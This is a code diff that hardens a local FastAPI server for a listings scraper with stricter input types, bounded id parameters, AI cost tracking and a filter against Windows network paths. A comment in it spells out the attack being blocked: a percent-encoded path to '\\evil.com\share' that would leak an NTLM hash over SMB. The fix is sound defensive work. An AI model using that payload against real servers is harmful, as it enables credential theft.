@@ -9,20 +9,22 @@ import threading
 from contextlib import asynccontextmanager
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
+from typing import Annotated
 from urllib.parse import urlsplit
 import uvicorn
 from fastapi import FastAPI, HTTPException, Request
+from fastapi import Path as PathParam
 from fastapi.middleware.gzip import GZipMiddleware
 from fastapi.responses import JSONResponse, Response
 from fastapi.staticfiles import StaticFiles
-from pydantic import BaseModel
+from pydantic import BaseModel, StrictBool, StrictInt
 from rich import print
 from starlette.middleware.trustedhost import TrustedHostMiddleware
 from Scraper import AI
 from Scraper.Console import utf8_output
 from Scraper.DB import (DB_FILE, DBError, add_blocked_seller, ai_cost_today, connect_to_db, create_tables, delete_ai_search,
                         delete_blocked_seller, get_ai_search, get_ai_searches, get_blocked_sellers, get_known_places, get_listings,
-                        listings_version, save_ai_search)
+                        listings_version, record_ai_usage, save_ai_search)
 from Scraper.Derive import block_rule_of, blocked_rules, is_blocked, with_derived
 from Scraper.Engine import main as run_engine
 from Scraper.Output import build_workbook
@@ -308,6 +310,18 @@ async def same_origin_only(request, call_next):
             return JSONResponse({"detail": "Kërkesa u bllokua: vjen nga një faqe tjetër."}, status_code=403)
     return await call_next(request)
 
+#Windows network paths: StaticFiles joins the URL path onto UI_DIR and calls realpath() BEFORE checking it stays inside UI_DIR.
+#"/%5c%5cevil.com%5cshare" decodes to \\evil.com\share, so realpath() would open an SMB connection to that server (leaking the
+#agent's NTLM hash) and hang a worker thread for ~40 s. Any website can trigger it with an <img> pointing at 127.0.0.1, because a
+#GET passes the Host check. No real URL of ours has a backslash, a colon (drive letters) or a NUL byte, so refuse them up front.
+#scope["path"] is the percent-decoded path, the same string StaticFiles uses.
+@app.middleware("http")
+async def no_windows_paths(request, call_next):
+    path = request.scope["path"]
+    if "\\" in path or ":" in path or "\x00" in path:
+        return JSONResponse({"detail": "Not Found"}, status_code=404)
+    return await call_next(request)
+
 #DNS rebinding: a website can point its own domain at 127.0.0.1 and read our API as "same origin". Its requests still carry
 #its own domain in the Host header, so only accept ours. Added last, so it runs first.
 app.add_middleware(TrustedHostMiddleware, allowed_hosts=[*LOCAL_HOSTS, *([PUBLIC_HOST] if PUBLIC_HOST else [])])
@@ -318,19 +332,23 @@ app.add_middleware(GZipMiddleware, minimum_size=2000) #The listings JSON shrinks
 async def db_error(request: Request, error: DBError):
     return JSONResponse({"detail": "Databaza nuk u lexua. Provo përsëri pas pak."}, status_code=503)
 
+#Request bodies use strict types: in pydantic's lax mode true would pass as the number 1 and "5" as 5
 class AutoRequest(BaseModel):
-    interval_minutes: int
+    interval_minutes: StrictInt
 
 class PreferencesRequest(BaseModel):
-    skip_agencies: bool
+    skip_agencies: StrictBool
 
 class ScheduleRequest(BaseModel):
-    enabled: bool
+    enabled: StrictBool
     time: str
-    interval_minutes: int
+    interval_minutes: StrictInt
 
 class BlockRequest(BaseModel):
-    listing_id: int
+    listing_id: StrictInt
+
+#An id from the URL. SQLite ids fit in 64 bits; a bigger number raised OverflowError (a 500) instead of a clean 404/422.
+RowId = Annotated[int, PathParam(ge=1, le=2**63 - 1)]
 
 class AskRequest(BaseModel):
     question: str
@@ -392,7 +410,10 @@ def api_ai_ask(body: AskRequest):
         try:
             answer = AI.question_to_filters(question, get_known_places(connection), known_areas(listings))
         except AI.AIError as error:
+            if error.usage: #Claude answered, so the call was paid even though it failed: it counts toward the cap
+                record_ai_usage(connection, error.model, error.usage)
             raise HTTPException(status_code=error.status, detail=error.message_sq)
+        record_ai_usage(connection, answer["model"], answer["usage"])
         results = run_search(listings, answer["filters"])
         filters_json = answer["filters"].model_dump_json()
         search_id = save_ai_search(connection, question, filters_json, answer["understood"], answer["not_supported"],
@@ -423,7 +444,7 @@ def api_ai_history():
 
 #Endpoint: one saved AI question, so a search has its own link (#/ai/12) that survives a page reload
 @app.get("/api/ai/history/{search_id}")
-def api_ai_history_one(search_id: int):
+def api_ai_history_one(search_id: RowId):
     connection = open_db()
     try:
         found = get_ai_search(connection, search_id)
@@ -435,7 +456,7 @@ def api_ai_history_one(search_id: int):
 
 #Endpoint: delete one saved AI question
 @app.delete("/api/ai/history/{search_id}")
-def api_ai_history_delete(search_id: int):
+def api_ai_history_delete(search_id: RowId):
     connection = open_db()
     try:
         if not delete_ai_search(connection, search_id):
@@ -518,7 +539,7 @@ def api_blocked():
 
 #Endpoint: who blocking this listing's seller would block and how many listings that hides, for the question the agent confirms
 @app.get("/api/blocked/preview/{listing_id}")
-def api_blocked_preview(listing_id: int):
+def api_blocked_preview(listing_id: RowId):
     connection = open_db()
     try:
         rule = block_rule_of(stored_listing(connection, listing_id))
@@ -544,7 +565,7 @@ def api_blocked_add(body: BlockRequest):
 
 #Endpoint: unblock a seller, their listings come back
 @app.delete("/api/blocked/{blocked_id}")
-def api_blocked_delete(blocked_id: int):
+def api_blocked_delete(blocked_id: RowId):
     connection = open_db()
     try:
         if not delete_blocked_seller(connection, blocked_id):
